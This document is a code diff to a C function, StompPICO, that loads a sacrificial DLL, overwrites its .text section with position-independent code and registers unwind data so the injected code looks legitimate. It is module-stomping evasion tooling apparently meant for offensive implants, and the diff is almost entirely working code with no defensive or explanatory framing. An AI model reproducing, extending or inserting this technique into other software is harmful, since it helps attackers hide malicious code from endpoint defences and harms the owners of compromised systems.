@@ -2,44 +2,63 @@
 
 static BOOL StompPICO( PICO_ARGS picoArgs ) {
     DWORD oldProt = 0;
-    HMODULE hModule = KERNEL32$LoadLibraryExA( picoArgs.sacrificialDll, NULL, DONT_RESOLVE_DLL_REFERENCES );
+
+    HMODULE hModule = KERNEL32$LoadLibraryExA(picoArgs.sacrificialDll, NULL, DONT_RESOLVE_DLL_REFERENCES);
     if ( !hModule ) {
         StealthDbg("ERROR: failed to load sacrificial DLL '%s'\n", picoArgs.sacrificialDll);
         return FALSE;
     }
-
     StealthDbg("loaded sacrificial DLL '%s' at %p\n", picoArgs.sacrificialDll, hModule);
 
-    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
-    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)( ( ULONG_PTR ) hModule + pDosHeader->e_lfanew );
-    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION( pNtHeader );
+    PIMAGE_DOS_HEADER   pDosHeader = (PIMAGE_DOS_HEADER)hModule;
+    PIMAGE_NT_HEADERS   pNtHeader  = (PIMAGE_NT_HEADERS)((ULONG_PTR)hModule + pDosHeader->e_lfanew);
+    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeader);
+
     PVOID pTextSection = NULL;
-    DWORD textSize = 0;
+    DWORD textSize     = 0;
+
     for ( WORD i = 0; i < pNtHeader->FileHeader.NumberOfSections; i++ ) {
-        if ( ( *( DWORD * ) pSectionHeader->Name | 0x20202020 ) == 'xet.' ) {
-            pTextSection = ( PVOID )( ( ULONG_PTR ) hModule + pSectionHeader->VirtualAddress );
-            textSize = pSectionHeader->Misc.VirtualSize;
+        if ( (*(DWORD*)pSection->Name | 0x20202020) == 'xet.' ) {
+            pTextSection = (PVOID)((ULONG_PTR)hModule + pSection->VirtualAddress);
+            textSize     = pSection->Misc.VirtualSize;
             StealthDbg("found .text section at %p with size 0x%X\n", pTextSection, textSize);
             break;
         }
-        pSectionHeader++;
+        pSection++;
     }
 
     if ( !pTextSection || textSize == 0 ) {
         StealthDbg("ERROR: failed to find .text section in sacrificial DLL\n");
-        KERNEL32$VirtualFree( hModule, 0, MEM_RELEASE );
+        KERNEL32$VirtualFree(hModule, 0, MEM_RELEASE);
         return FALSE;
     }
 
     *(picoArgs.pico_dst) = (PICO*)pTextSection;
 
-    KERNEL32$VirtualProtect( pTextSection, textSize, PAGE_READWRITE, &oldProt );
-    PicoLoad( picoArgs.funcs, picoArgs.pico_src, (*picoArgs.pico_dst)->code, (*picoArgs.pico_dst)->data );
+    /* Make .text writable for PicoLoad + unwind data */
+    KERNEL32$VirtualProtect(pTextSection, textSize, PAGE_READWRITE, &oldProt);
 
-    StealthDbg("PICO loaded into sacrificial DLL, restoring .text permissions to PAGE_EXECUTE_READ\n");
+    PicoLoad(picoArgs.funcs, picoArgs.pico_src, (*picoArgs.pico_dst)->code, (*picoArgs.pico_dst)->data);
 
-    KERNEL32$VirtualProtect( (*picoArgs.pico_dst)->code, PicoCodeSize( picoArgs.pico_src ), PAGE_EXECUTE_READ, &oldProt );
+    DWORD picoCodeSize = (DWORD)PicoCodeSize(picoArgs.pico_src);
+    unsigned char* code = (unsigned char*)(*picoArgs.pico_dst)->code;
+    
+    // /* Write 4-byte leaf UNWIND_INFO after code */
+    unsigned char* unwindSlot = code + picoCodeSize;
+    unwindSlot[0] = 0x01; /* Version=1, NHANDLER */
+    unwindSlot[1] = 0x00; /* SizeOfProlog = 0    */
+    unwindSlot[2] = 0x00; /* CountOfCodes = 0    */
+    unwindSlot[3] = 0x00; /* FrameRegister = 0   */
 
+    RUNTIME_FUNCTION* rfTable = picoArgs.pico_rf_storage;
+    rfTable[0].BeginAddress   = 0;
+    rfTable[0].EndAddress     = picoCodeSize;
+    rfTable[0].UnwindData     = picoCodeSize; /* RVA to UNWIND_INFO from code base */
+
+    DWORD coverSize = picoCodeSize + 4;
+    KERNEL32$VirtualProtect(code, coverSize, PAGE_EXECUTE_READ, &oldProt);
+    KERNEL32$RtlDeleteFunctionTable((PRUNTIME_FUNCTION)hModule);
+    BOOL rfResult = KERNEL32$RtlAddFunctionTable(rfTable, 1, (DWORD64)code);
     return TRUE;
 }
 
